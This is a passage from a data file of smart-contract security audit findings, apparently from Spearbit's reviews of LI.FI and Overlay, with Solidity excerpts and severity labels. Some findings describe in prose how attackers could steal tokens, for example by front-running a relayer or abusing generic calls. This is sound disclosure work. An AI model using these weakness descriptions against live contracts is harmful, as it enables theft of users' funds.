_nxtpData.amount : 0; // Initiate bridge transaction on sending chain ITransactionManager.TransactionData memory result = txManager.prepare{ value: value }( ITransactionManager.PrepareArgs( _nxtpData.invariantData, _nxtpData.amount, _nxtpData.expiry, _nxtpData.encryptedCallData, _nxtpData.encodedBid, _nxtpData.bidSignature, _nxtpData.encodedMeta ) ); return result.transactionId; }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Executor contract should not handle cross-chain swap from Connext", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The Executor contract is designed to handle a swap at the destination chain. The LIFI protocol may build a cross-chain transaction to call Executor.swapAndCompleteBridgeTokens at the destination chain. In order to do a flexible swap, the Executor can perform arbitrary execution. Executor.sol#L323-L333 57 function _executeSwaps( LiFiData memory _lifiData, LibSwap.SwapData[] calldata _swapData, address payable _receiver ) private noLeftovers(_swapData, _receiver) { for (uint256 i = 0; i < _swapData.length; i++) { if (_swapData[i].callTo == address(erc20Proxy)) revert UnAuthorized(); // Prevent calling ,! ERC20 Proxy directly LibSwap.SwapData calldata currentSwapData = _swapData[i]; LibSwap.swap(_lifiData.transactionId, currentSwapData); } } However, the receiver address is a privileged address in some bridging services. Allowing users to do arbitrary execution/ external calls is dangerous. The Connext protocol is an example : Connext contractAPI#cancel The receiver address can prematurely cancel a cross-chain transaction. When a cross-chain execution is canceled, the funds would be sent to the fallback address without executing the external call. Exploiters can front-run a gelato relayer and cancel a cross-chain execution. The (post-swap) tokens will be sent to the receivers address. The exploiters can grab the tokens left in the Executor in the same transaction.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Avoid using strings in the interface of the Axelar Facet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The Axelar Facet uses strings to indicate the destinationChain, destinationAddress, which is different then on other bridge facets. function executeCallWithTokenViaAxelar( string memory destinationChain, string memory destinationAddress, string memory symbol, ... ) ...{ } The contract address is (or at least can be) encoded as a hex string, as seen in this example: /// https://etherscan.io/tx/0x7477d550f0948b0933cf443e9c972005f142dfc5ef720c3a3324cefdc40ecfa2 # 0 1 2 3 4 Type Name destinationChain string destinationContractAddress payload symbol amount bytes string uint256 50000000 0xA57ADCE1d2fE72949E4308867D894CD7E7DE0ef2 Data binance string USDC 58 The Axelar bridge allows bridging to non EVM chains, however the LiFi protocol doesnt seem to support thus. So its good to prevent accidentally sending to non EVM chains. Here are the supported non EVM chains: non-evm- networks The Axelar interface doesnt have a (compatible) emit.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Hardcode source Nomad domain ID via immutable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "AmarokFacet takes source domain ID as a user parameter and passes it to the bridge: originDomain: _bridgeData.srcChainDomain User provided can be incorrect, and Connext will later revert the transaction. See BridgeFacet.sol#L319-L321: if (_args.params.originDomain != s.domain) { revert BridgeFacet__xcall_wrongDomain(); }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Amount swapped not emitted", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The emits LiFiTransferStarted() and LiFiTransferCompleted() dont emit the amount after the swap (e.g. the real amount that is being bridged / transferred to the receiver). This might be useful to add. 59 event LiFiTransferStarted( bytes32 indexed transactionId, string bridge, string bridgeData, string integrator, address referrer, address sendingAssetId, address receivingAssetId, address receiver, uint256 amount, uint256 destinationChainId, bool hasSourceSwap, bool hasDestinationCall ); event LiFiTransferCompleted( bytes32 indexed transactionId, address receivingAssetId, address receiver, uint256 amount, uint256 timestamp );", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Comment is not compatible with code", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "On the HyphenFacet, Comment is mentioned that approval is given to Anyswap. But, approval is given to Hyphen router. function _startBridge(HyphenData memory _hyphenData) private { // Check chain id if (block.chainid == _hyphenData.toChainId) revert CannotBridgeToSameNetwork(); if (_hyphenData.token != address(0)) { // Give Anyswap approval to bridge tokens LibAsset.maxApproveERC20(IERC20(_hyphenData.token), _hyphenData.router, _hyphenData.amount); }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Move whitelist to LibSwap.swap()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The function LibSwap.swap() is dangerous because it can call any function of any contract. If this is exposed to the outside (like in GenericBridgeFacet), is might enable access to transferFrom() and thus stealing tokens. Also see issue \"Too generic calls in GenericBridgeFacet allow stealing of tokens\" Luckily most of the time LibSwap.swap() is called via _executeSwaps(), which has a whitelist and reduces the risk. To improve security it would be better to integrate the whitelists in LibSwap.swap(). Note: also see issue \"_executeSwaps of Executor.sol doesnt have a whitelist\" library LibSwap { function swap(bytes32 transactionId, SwapData calldata _swapData) internal { if (!LibAsset.isContract(_swapData.callTo)) revert InvalidContract(); ... (bool success, bytes memory res) = _swapData.callTo.call{ value: nativeValue ,! }(_swapData.callData); ... } } contract SwapperV2 is ILiFi { function _executeSwaps(...) ... { ... if ( !(appStorage.dexAllowlist[currentSwapData.approveTo] && appStorage.dexAllowlist[currentSwapData.callTo] && appStorage.dexFuncSignatureAllowList[bytes32(currentSwapData.callData[:8])]) ) revert ContractCallNotAllowed(); LibSwap.swap(_lifiData.transactionId, currentSwapData); } } }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Redundant check on the HyphenFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "In the HyphenFacet, there is a condition which checks source chain is different than destination chain id. However, the conditional check is already placed on the Hyphen contracts. _depositErc20, _depositNative) function _startBridge(HyphenData memory _hyphenData) private { // Check chain id if (block.chainid == _hyphenData.toChainId) revert CannotBridgeToSameNetwork(); }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Check input amount equals swapped amount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The bridge functions dont check that input amount ( _bridgeData.amount or msg.value) is equal to the swapped amount (_swapData[0].fromAmount). This could lead to funds remaining in the LiFi Diamond or Executor. Luckily noLeftovers() or checks on startingBalance solve this by sending the remaining balance to the origina- tor or receiver. However this is fixing symptoms instead of preventing the issue. function swapAndStartBridgeTokensViaOmniBridge( ... LibSwap.SwapData[] calldata _swapData, BridgeData calldata _bridgeData ) ... { ... uint256 amount = _executeAndCheckSwaps(_lifiData, _swapData, payable(msg.sender)); ... }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Use same layout for facets", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The different bridge facets use different layouts for the source code. This can be seen at the call to _startBridge(). The code is easier to maintain If it is the same everywhere. 62 AmarokFacet.sol: ArbitrumBridgeFacet.sol: OmniBridgeFacet.sol: OptimismBridgeFacet.sol: PolygonBridgeFacet.sol: StargateFacet.sol: AcrossFacet.sol: CBridgeFacet.sol: GenericBridgeFacet.sol: GnosisBridgeFacet.sol: HopFacet.sol: HyphenFacet.sol: NXTPFacet.sol: AnyswapFacet.sol: WormholeFacet.sol: AxelarFacet.sol: _startBridge(_lifiData, _bridgeData, amount, true); _startBridge(_lifiData, _bridgeData, amount, true); _startBridge(_lifiData, _bridgeData, amount, true); _startBridge(_lifiData, _bridgeData, amount, true); _startBridge(_lifiData, _bridgeData, true); _startBridge(_stargateData, _lifiData, nativeFee, true); _startBridge(_acrossData); _startBridge(_cBridgeData); _startBridge(_bridgeData); _startBridge(gnosisBridgeData); _startBridge(_hopData); _startBridge(_hyphenData); _startBridge(_nxtpData); _startBridge(_anyswapData, underlyingToken, isNative); _startBridge(_wormholeData); // no _startBridge", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Safety check is missing on the remaining amount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "On the FeeCollector contract, There is no safety check to ensure remaining amount doesnt under- flow and revert. function collectNativeFees( uint256 integratorFee, uint256 lifiFee, address integratorAddress ) external payable { ... ... } uint256 remaining = msg.value - (integratorFee + lifiFee);", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Entire struct can be emitted", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The emit LiFiTransferStarted() generally outputs the entire struct _lifiData by specifying all Its also possible to emit the entire struct in one go. This would make the code smaller and fields of the struct. easier to maintain. function _startBridge(LiFiData calldata _lifiData, ... ) ... { ... // do actions emit LiFiTransferStarted( _lifiData.transactionId, \"omni\", \"\", _lifiData.integrator, _lifiData.referrer, _lifiData.sendingAssetId, _lifiData.receivingAssetId, _lifiData.receiver, _lifiData.amount, _lifiData.destinationChainId, _hasSourceSwap, false ); }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Redundant return value from internal function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Callers of NXTPFacet._startBridge() function never use its return value.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Change comment on the LibAsset", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The following comment is used in the LibAsset.sol contract. However, Connext doesnt have this file anymore and deleted with the following commit. /// @title LibAsset /// @author Connext <support@connext.network> /// @notice This library contains helpers for dealing with onchain transfers /// /// library LibAsset {} of assets, including accounting for the native asset `assetId` conventions and any noncompliant ERC20 transfers", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Integrate all variants of _executeAndCheckSwaps()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "There are multiple functions that are more or less the same:  swapAndCompleteBridgeTokensViaStargate() of Executor.sol  swapAndCompleteBridgeTokens() of Executor.sol  swapAndExecute() of Executor.sol  _executeAndCheckSwaps() of SwapperV2.sol  _executeAndCheckSwaps() of Swapper.sol  swapAndCompleteBridgeTokens() of XChainExecFacet As these are important functions it is worth the trouble to have one code base to maintain. For example swapAnd- CompleteBridgeTokens() doesnt check msg.value ==0 when ERC20 tokens are send. Note: swapAndCompleteBridgeTokensViaStargate() of StargateFacet.sol already uses SwapperV2.sol", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Utilize NATIVE_ASSETID constant from LibAsset", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "In the codebase, LibAsset library contains the variable which defines zero address. However, on the facets the check is repeated. Code should not be repeated and its better to have one version used everywhere to reduce likelihood of bugs. contract AcrossFacet { address internal constant ZERO_ADDRESS = 0x0000000000000000000000000000000000000000; } contract DexManagerFacet { if (_dex == 0x0000000000000000000000000000000000000000) } contract WithdrawFacet { address private constant NATIVE_ASSET = 0x0000000000000000000000000000000000000000; ... } address sendTo = (_to == address(0)) ? msg.sender : _to;", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Native matic will be treated as ERC20 token", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "LiFi supports Polygon on their implementation. However, Native MATIC on the Polygon has the contract 0x0000000000000000000000000000000000001010 address. Even if, It does not pose any risk, Native Matic will be treated as an ERC20 token. contract WithdrawFacet { address private constant NATIVE_ASSET = 0x0000000000000000000000000000000000000000; // address(0) ...", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Multiple versions of noLeftovers modifier", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The modifier noLeftovers is defined in 3 different files: Swapper.sol, SwapperV2.sol and Ex- ecutor.sol. While the versions on Swapper.sol and Executor.sol are the same, they differ with the one in Executor.sol. Assuming the recommendation for \"Processing of end balances\" is followed, the only difference is that noLeftovers in SwapperV2.sol doesnt revert when new balance is less than initial balance. Code should not be repeated and its better to have one version used everywhere to reduce likelihood of bugs.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Reduce unchecked scope", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Both zapIn() functions in FusePoolZap.sol operate in unchecked block which means any contained arithmetic can underflow or overflow. Currently, it effects only one line in both functions:  FusePoolZap.sol#L67: uint256 mintAmount = IERC20(address(fToken)).balanceOf(address(this)) - preMintBalance;  FusePoolZap.sol#L104 mintAmount = mintAmount - preMintBalance; Having unchecked for such a large scope when it is applicable to only one line is dangerous.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "No event exists for core paths/functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Several key actions are defined without event declarations. Owner only functions that change critical parameters can emit events to record these changes on-chain for off-chain monitors/tools/interfaces. There are 4 instances of this issue: 67 contract PeripheryRegistryFacet { function registerPeripheryContract(...) ... { } } contract LibAccess { function addAccess(...) ... { } function removeAccess(...) ... { } } contract AccessManagerFacet { function setCanExecute(...) ... { } }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Rename _receiver to _leftoverReceiver", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "In the contracts Swapper.sol, SwapperV2.sol and Executor.sol the parameter _receiver is used in various places. Its name seems to suggest that the result of the swapped tokens are send to the _receiver, however this is not the case. Instead the left over tokens are send to the _receiver. This makes the code more difficult to read and maintain. contract SwapperV2 is ILiFi { modifier noLeftovers(..., address payable _receiver) { ... } function _executeAndCheckSwaps(..., address payable _receiver) ... { ... } function _executeSwaps(..., address payable _receiver) ... { ... } }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Native tokens dont need SwapData.approveTo", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The functions _executeSwaps() of both SwapperV2.sol and Swapper.sol use a whitelist to make sure the right functions in the allowed dexes are called. These checks also include a check on approveTo, however approveTo is not relevant when a native token is being used. Currently the caller of the Lifi Diamond has to specify a whitelisted currentSwapData.approveTo to be able to execute _executeSwaps() which doesnt seem logical. Present in both SwapperV2.sol and Swapper.sol: function _executeSwaps(...) ... { ... if ( !(appStorage.dexAllowlist[currentSwapData.approveTo] && appStorage.dexAllowlist[currentSwapData.callTo] && appStorage.dexFuncSignatureAllowList[bytes32(currentSwapData.callData[:8])]) ) revert ContractCallNotAllowed(); LibSwap.swap(_lifiData.transactionId, currentSwapData); } }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Inaccurate comment on the maxApproveERC20() function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "During the code review, It has been observed that comment is incompatible with the functionality. maxApproveERC20 function approves MAX If asset id does not have sufficient allowance. The comment can be replaced with If a sufficient allowance is not present, the allowance is set to MAX. /// @notice Gives MAX approval for another address to spend tokens /// @param assetId Token address to transfer /// @param spender Address to give spend approval to /// @param amount Amount to approve for spending function maxApproveERC20( IERC20 assetId, address spender, uint256 amount )", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Undocumented contracts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "All systematic contracts are documented on the docs directory. However, several contracts are not documented. LiFi is integrated with third party platforms through API. To understand code functionality, the related contracts should be documented in the directory.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Utilize built-in library function on the address check", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "In the codebase, LibAsset library contains the function which determines whether the given assetId is the native asset. However, this check is not used and many of the other contracts are applying address check seperately. contract AmarokFacet { function startBridgeTokensViaAmarok(...) ... { ... if (_bridgeData.assetId == address(0)) ... } function swapAndStartBridgeTokensViaAmarok(... ) ... { ... if (_bridgeData.assetId == address(0)) ... } } contract AnyswapFacet { function swapAndStartBridgeTokensViaAnyswap(...) ... { ... if (_anyswapData.token == address(0)) revert TokenAddressIsZero(); ... } } contract HyphenFacet { function _startBridge(...) ... { ... if (_hyphenData.token != address(0)) ... } } contract StargateFacet { function _startBridge(...) ... { ... if (token == address(0)) ... 70 } } contract LibAsset { function transferFromERC20(...) ... { ... if (assetId == NATIVE_ASSETID) revert NullAddrIsNotAnERC20Token(); ... } function transferAsset(...) ... { ... (assetId == NATIVE_ASSETID) ... } }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Consider using wrapped native token", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The code currently supports bridging native tokens. However this has the following drawbacks:  not every bridge supports native tokens;  native tokens have an inherent risk of reentrancy;  native tokens introduce additional code paths, which is more difficult to maintain and results in a higher risk of bugs. Also wrapped tokens are more composable. This is also useful for bridges that currently dont support native tokens like the AxelarFacet, the WormholeFacet, and the StargateFacet.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Incorrect event emitted", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Li.fi follows a two-step ownership transfer pattern, where the current owner first proposes an address to be the new owner. Then that address accepts the ownership in a different transaction via confirmOwnership- Transfer(): function confirmOwnershipTransfer() external { if (msg.sender != pendingOwner) revert NotPendingOwner(); owner = pendingOwner; pendingOwner = LibAsset.NULL_ADDRESS; emit OwnershipTransferred(owner, pendingOwner); } At the time of emitting OwnershipTransferred, pendingOwner is always address(0) and owner is the new owner. This event should be used to log the addresses between which the ownership transfer happens.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "If statement does not check mintAmount properly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "On the zapIn function, mintAmount is checked with the following If statement. However, It is directly getting contract balance instead of taking difference between mintAmount and preMintBalance. ... ... uint256 mintAmount = IERC20(address(fToken)).balanceOf(address(this)); if (!success && mintAmount == 0) { revert MintingError(res); } mintAmount = mintAmount - preMintBalance;", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Use address(0) for zero address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Its better to use shorthands provided by Solidity for popular constant values to improve readability and likelihood of errors. address internal constant NULL_ADDRESS = 0x0000000000000000000000000000000000000000; //address(0)", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Better variable naming", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "MAX_INT is defined to be the maximum value of uint256 data type: uint256 private constant MAX_INT = type(uint256).max; This variable name can be interpreted as the maximum value of int256 data type which is lower than type(uint256).max.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Event is missing indexed fields", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Index event fields make the field more quickly accessible to off-chain tools that parse events. How- ever, note that each index field costs extra gas during emission, so its not necessarily best to index the maximum allowed per event (three fields).", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Remove misleading comment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "WithdrawFacet.sol has the following misleading comment which can be removed. Its unclear why this comment was made. address self = address(this); // workaround for a possible solidity bug", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Redundant events/errors/imports on the contracts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "During the code review, It has been observed that several events and errors are not used in the contracts. With the deleting redundant events and errors, gas can be saved.  FusePoolZap.sol#L28 - CannotDepositNativeToken  GenericSwapFacet.sol#L7 - ZeroPostSwapBalance  WormholeFacet.sol#L12 - InvalidAmount and InvalidConfig  HyphenFacet.sol#L32 - HyphenInitialized  HyphenFacet.sol#L9 - InvalidAmount and InvalidConfig  HopFacet.sol#L9 - InvalidAmount, InvalidConfig and InvalidBridgeConfigLength  HopFacet.sol#L36- HopInitialized  PolygonBridgeFacet.sol#L28 - InvalidConfig  Executor.sol#L5 - IAxelarGasService  AcrossFacet.sol#L37 - UseWethInstead, InvalidAmount, NativeValueWithERC, InvalidConfig  NXTPFacet.sol#L9 - InvalidAmount, NativeValueWithERC, NoSwapDataProvided, InvalidConfig", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "forceSlow option is disabled on the AmarokFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "On the AmarokFacet contract, forceSlow option is disabled. According to documentation, forceS- low is an option that allows users to take the Nomad slow path (~30 mins) instead of paying routers a 0.05% fee on their transaction. ... IConnextHandler.XCallArgs memory xcallArgs = IConnextHandler.XCallArgs({ params: IConnextHandler.CallParams({ to: _bridgeData.receiver, callData: _bridgeData.callData, originDomain: _bridgeData.srcChainDomain, destinationDomain: _bridgeData.dstChainDomain, agent: _bridgeData.receiver, recovery: msg.sender, forceSlow: false, receiveLocal: false, callback: address(0), callbackFee: 0, relayerFee: 0, slippageTol: _bridgeData.slippageTol }), transactingAssetId: _bridgeData.assetId, amount: _amount }); ...", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Incomplete NatSpec", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Some functions are missing @param for some of their parameters. Given that NatSpec is an impor- tant part of code documentation, this affects code comprehension, auditability and usability.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Use nonReentrant modifier in a consistent way", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "AxelarFacet, zapIn of the contract FusePoolZap and completeBridgeTokensViaStargate() - swapAndCom- pleteBridgeTokensViaStargate of the StargateFacet dont have a nonReentrant modifier. All other facets that integrate with the external contract do have this modifier. executeCallWithTokenViaAxelar of contract AxelarFacet { function executeCallWithTokenViaAxelar(...) ... { } function executeCallViaAxelar(...) ... { } } contract FusePoolZap { function zapIn(...) ... { } } There are 2 versions of sgReceive() / completeBridgeTokensViaStargate() which use different locations for nonReentrant. The makes the code more difficult to maintain and verify. contract StargateFacet is ILiFi, SwapperV2, ReentrancyGuard { function sgReceive(...) external nonReentrant { ... this.swapAndCompleteBridgeTokensViaStargate(lifiData, swapData, assetId, receiver); ... } function completeBridgeTokensViaStargate(...) external { ... } } contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function sgReceive(...) external { ... this.swapAndCompleteBridgeTokensViaStargate(lifiData, swapData, assetId, payable(receiver)); ... } function swapAndCompleteBridgeTokensViaStargate(...) external payable nonReentrant { } }", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Typos on the codebase", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Across the codebase, there are typos on the comments.  cancelOnwershipTransfer -> cancelOwnershipTransfer.  addresss -> address.  Conatains -> Contains.  Intitiates -> Initiates.", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Store all error messages in GenericErrors.sol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "The file GenericErrors.sol contains several error messages and is used from most other solidity files. However several other error messages are defined in the solidity files themselves. It would be more con- sistent and easier to maintain to store these in GenericErrors.sol as well. Note: the Periphery contract also contains error messages which are not listed below. Here are the error messages contained in the solidity files: Facets/AcrossFacet.sol:37: Facets/AmarokFacet.sol:31: Facets/ArbitrumBridgeFacet.sol:30: Facets/GnosisBridgeFacet.sol:31: Facets/GnosisBridgeFacet.sol:32: Facets/OmniBridgeFacet.sol:27: Facets/OptimismBridgeFacet.sol:29: Facets/OwnershipFacet.sol:20: Facets/OwnershipFacet.sol:21: Facets/OwnershipFacet.sol:22: Facets/OwnershipFacet.sol:23: Facets/PolygonBridgeFacet.sol:28: Facets/PolygonBridgeFacet.sol:29: Facets/StargateFacet.sol:39: Facets/StargateFacet.sol:40: Facets/StargateFacet.sol:41: Facets/WithdrawFacet.sol:20: Facets/WithdrawFacet.sol:21: Helpers/ReentrancyGuard.sol:20: Libraries/LibAccess.sol:18: Libraries/LibSwap.sol:9: error UseWethInstead(); error InvalidReceiver(); error InvalidReceiver(); error InvalidDstChainId(); error InvalidSendingToken(); error InvalidReceiver(); error InvalidReceiver(); error NoNullOwner(); error NewOwnerMustNotBeSelf(); error NoPendingOwnershipTransfer(); error NotPendingOwner(); error InvalidConfig(); error InvalidReceiver(); error InvalidConfig(); error InvalidStargateRouter(); error InvalidCaller(); error NotEnoughBalance(uint256 requested, uint256 available); error WithdrawFailed(); error ReentrancyError(); error UnAuthorized(); error NoSwapFromZeroBalance();", "labels": ["Spearbit", "LIFI", "Severity: Informational"]}, {"title": "Use unchecked in TickMath.sol and FullMath.sol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "Uniswap math libraries rely on wrapping behaviour for conducting arithmetic operations. Solidity version 0.8.0 introduced checked arithmetic by default where operations that cause an overflow would revert. Since the code was adapted from Uniswap and written in Solidity version 0.7.6, these arithmetic operations should be wrapped in an unchecked block.", "labels": ["Spearbit", "Overlay", "Severity: High Risk"]}, {"title": "Liquidation might fail", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The liquidate() function checks if a position can be liquidated and via liquidatable(), uses maintenanceMarginFraction as a factor to determine if enough value is left. However, in the rest of the liqui- date() function liquidationFeeRate is used to determine the fee paid to the liquidator. It is not necessarily true that enough value is left for the fee, as two different ways are used to calculate this which means that positions might be liquidated. This is classified as high risk because liquidation is an essential functionality of Overlay. contract OverlayV1Market is IOverlayV1Market { function liquidate(address owner, uint256 positionId) external { ... require(pos.liquidatable(..., maintenanceMarginFraction),\"OVLV1:!liquidatable\"); ... uint256 liquidationFee = value.mulDown(liquidationFeeRate); ... ovl.transfer(msg.sender, value - liquidationFee); ovl.transfer(IOverlayV1Factory(factory).feeRecipient(), liquidationFee); } } library Position { function liquidatable(..., uint256 maintenanceMarginFraction) ... { ... uint256 maintenanceMargin = posNotionalInitial.mulUp(maintenanceMarginFraction); can_ = val < maintenanceMargin; } } 4", "labels": ["Spearbit", "Overlay", "Severity: High Risk"]}, {"title": "Rounding down of snapAccumulator might influence calculations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The function transform() lowers snapAccumulator with the following equation: (snapAccumulator * int256(dt)) / int256(snapWindow). During the time that snapAccumulator * dt is smaller than snapWindow this will be rounded down to 0, which means snapAccumulator will stay at the same value. Luckily, dt will eventually reach the value of snapWindow and by then the value wont be rounded down to 0 any more. Risk lies in calculations diverging from formulas written in the whitepaper. Note: Given medium risk severity because the probability of this happening is high, while impact is likely low. function transform(...) ... { ... snapAccumulator -= (snapAccumulator * int256(dt)) / int256(snapWindow); ... }", "labels": ["Spearbit", "Overlay", "Severity: Medium Risk"]}, {"title": "Verify pool legitimacy", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overlay-Spearbit-Security-Review.pdf", "body": "The constructor in OverlayV1UniswapV3Factory.sol and OverlayV1UniswapV3Feed.sol only does a partial check to see if the pool corresponds to the supplied tokens. This is accomplished by calling the pools functions but if the pool were to be malicious, it could return any token. Additionally, checks can be by- passed by supplying the same tokens twice. Because the deployFeed() function is permissionless, it is possible to deploy malicious feeds. Luckily, the de- ployMarket() function is permissioned and prevents malicious markets from being deployed. contract OverlayV1UniswapV3Factory is IOverlayV1UniswapV3FeedFactory, OverlayV1FeedFactory { constructor(address _ovlWethPool, address _ovl, ...) { ovlWethPool = _ovlWethPool; // no check on validity of _ovlWethPool here ovl = _ovl; } function deployFeed(address marketPool, address marketBaseToken, address marketQuoteToken, ...) external returns (address feed_) { // Permissionless ... // no check on validity of marketPool here } 5 } contract OverlayV1UniswapV3Feed is IOverlayV1UniswapV3Feed, OverlayV1Feed { constructor( address _marketPool, address _ovlWethPool, address _ovl, address _marketBaseToken, address _marketQuoteToken, ... ) ... { ... address _marketToken0 = IUniswapV3Pool(_marketPool).token0(); // relies on a valid _marketPool address _marketToken1 = IUniswapV3Pool(_marketPool).token1(); require(_marketToken0 == WETH || _marketToken1 == WETH, \"OVLV1Feed: marketToken != WETH\"); marketToken0 = _marketToken0; marketToken1 = _marketToken1; require( _marketToken0 == _marketBaseToken || _marketToken1 == _marketBaseToken, \"OVLV1Feed: marketToken != marketBaseToken\" ); require( _marketToken0 == _marketQuoteToken || _marketToken1 == _marketQuoteToken, \"OVLV1Feed: marketToken != marketQuoteToken\" ); marketBaseToken = _marketBaseToken; // what if _marketBaseToken == _marketQuoteToken == WETH ? marketQuoteToken = _marketQuoteToken; marketBaseAmount = _marketBaseAmount; // need OVL/WETH pool for ovl vs ETH price to make reserve conversion from ETH => OVL address _ovlWethToken0 = IUniswapV3Pool(_ovlWethPool).token0(); // relies on a 